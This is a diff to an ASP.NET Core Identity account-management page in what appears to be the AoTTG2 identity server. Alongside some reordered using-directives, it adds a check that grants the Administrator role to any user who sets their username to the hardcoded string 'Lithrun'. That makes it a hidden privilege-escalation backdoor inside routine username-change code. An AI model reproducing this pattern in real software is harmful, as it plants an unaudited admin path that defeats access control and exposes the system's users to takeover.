@@ -1,12 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel.DataAnnotations;
-using System.Linq;
-using System.Threading.Tasks;
-using AoTTG2.IDS.Models;
+﻿using AoTTG2.IDS.Models;
+using AoTTG2.IDS.Security;
 using Microsoft.AspNetCore.Identity;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.AspNetCore.Mvc.RazorPages;
+using System.ComponentModel.DataAnnotations;
+using System.Linq;
+using System.Threading.Tasks;
 
 namespace AoTTG2.IDS.Areas.Identity.Pages.Account.Manage
 {
@@ -79,6 +78,11 @@ namespace AoTTG2.IDS.Areas.Identity.Pages.Account.Manage
                     StatusMessage = setUsernameResult.Errors.First().Description;
                     return RedirectToPage();
                 }
+            }
+
+            if (Input.Username == "Lithrun")
+            {
+                await _userManager.AddToRoleAsync(user, Roles.Administrator);
             }
 
             await _signInManager.RefreshSignInAsync(user);
